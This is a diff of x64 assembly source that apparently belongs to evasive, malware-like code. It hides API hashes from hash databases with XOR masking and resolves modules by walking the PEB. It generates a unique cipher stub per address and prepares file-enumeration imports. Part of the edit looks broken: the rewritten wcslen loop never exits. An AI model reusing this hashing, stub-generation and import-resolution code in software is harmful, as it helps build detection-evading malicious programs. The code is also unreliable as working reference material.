@@ -258,10 +258,11 @@ hash_prime      equ            0x01000193  xor random_mask                      
 ; Our function hashes will all be double words of high entropy but at least     ;
 ; they won't be a dead giveaway in a hash database                              ;
 ;                                                                               ;
-hash_ntdll      equ            0x25959F7F xor random_mask                       ;
+hash_ntdll      equ            0x8B9A6A34 xor random_mask                       ;
 hash_ntavm      equ            0x6973F2B4 xor random_mask                       ;
 hash_ntpvm      equ            0xB7F40932 xor random_mask                       ;
-hash_k32        equ            0x00000000 xor random_mask   
+hash_k32        equ            0xC1C79AF3 xor random_mask   
+hash_kbase      equ            0x6458F824 xor random_mask
 hash_cfw        equ            0x00000000 xor random_mask   ; CreateFileW
 hash_gcd        equ            0x00000000 xor random_mask   ; GetCurrentDirec.
 hash_fff        equ            0x00000000 xor random_mask   ; FindFirstFile
@@ -283,7 +284,7 @@ dynimp ends                                                                     
 ; Function Prototypes
 ;                                                                             
 find_bytes      proto :qword, :qword, :qword, :qword
-
+genstub         proto :qword
 
 ;                                                                               ;
 ; ----------------------------------------------------------------------------- ;
@@ -354,10 +355,10 @@ genimps proc dimp:qword
 genimps endp
 
 ; Generate a unique cipher stub for the address
-genstub proc 
+genstub proc dimp:qword
     local   buf:qword
 ; allocate memory for the stub
-    mov     rbx, [rcx].dynimp.ntavm
+    mov     rbx, [dimp].dynimp.ntavm
     or      rcx, 0xffffffffffffffff
     lea     rdx, buf
     xor     r8, r8
@@ -471,7 +472,6 @@ getexp endp                                 ;                                   
 ; ----------------------------------------- ;                                   ;
 ; Resolve a module base address by hash     ;                                   ;
 getmod proc hash:qword                      ;                                   ;
-    local   modname[256*2]:byte             ; stack space for module name buf   ;
     local   first:qword                     ; first module entry                ;
     local   curr:qword                      ; current module entry              ;
     local   @rbx:qword
@@ -488,18 +488,9 @@ getmod proc hash:qword                      ;                                   
     mov     rbx, [rsi].ldte.moml.fw-10h     ; each LDR_MODULE links to others   ;
     mov     curr, rbx                       ; save current module               ;
 _loop:                                      ; loop over modules                 ;
-    lea     rcx, modname                    ;                                   ;
-    xor     edx, edx                        ;                                   ;
-    mov     r8d, 256                        ;                                   ;
-    call    memset                          ; clear the name buffer             ;
-    lea     rcx, modname                    ;                                   ;
-    lea     rdx, [rbx].ldte.basename.buffer ;                                   ;
-    call    wstrcpy                         ; copy the UNICODE_STRING buffer    ;
-    lea     rcx, modname                    ; convert it to lowercase           ;
-    call    wstrtolower                     ; returns the length as well        ;
-    lea     rcx, modname                    ;  (in bytes)                       ;
-    mov     rdx, rax                        ;                                   ;
-    imul    rdx, 2                          ; since unicode_strings are wide    ;
+    lea     rcx, [rbx].ldte.basename.buffer ;                                   ;
+    xor     edx, edx
+    mov     dx, [rbx].ldte.basename.len                   
     call    gethash                         ; get module name hash              ;
     cmp     rax, rdi                        ; match target?                     ;
     je      _match                          ;                                   ;
@@ -639,30 +630,20 @@ _done:                                      ;                                   
     retn                                    ;                                   ;
 wstrcpy endp                                ;                                   ;
 ; ----------------------------------------- ;                                   ;
-; Convert a wide string to lowercase        ;                                   ;
-wstrtolower proc  src:qword        
-    local   @rbx:qword
-    mov     @rbx, rbx                     
-    xor     eax, eax                        ;                                   ;
+; String length of wide string
+wcslen proc          
+    mov     rax, rcx                
 _loop:                                      ;                                   ;
-    mov     bx, [rcx+rax*2]                 ;                                   ;
-    test    bx, bx                          ;                                   ;
-    jz      _done                           ;                                   ;
-    cmp     bx, 'A'                         ;                                   ;
-    jl      _next                           ;                                   ;
-    cmp     bx, 'Z'                         ;                                   ;
-    jg      _next                           ;                                   ;
-    add     bx, 0x20                        ;                                   ;
-    mov     [rcx+rax*2], bx                 ;                                   ;
+    mov     dx, [rax]       
+    test    dx, dx                          ;                                   ;
 _next:                                      ;                                   ;
-    add     eax, 2                          ;                                   ;
+    add     rax, 2                          ;                                   ;
     jmp     _loop                           ;                                   ;
 _done:                                      ;                                   ;
-    imul    eax, 2                          ;                                   ;
-    inc     eax                             ;                                   ;
-    mov     rbx, @rbx
-    retn                                    ;                                   ;
-wstrtolower endp                            ;                                   ;
+    sub     rax, rcx
+    ret                                     ;                                   ;
+wcslen endp                            ;
+
 ; ----------------------------------------- ;                                   ;
 ; Calculate length of a string              ;                                   ;
 strlen proc  src:qword            
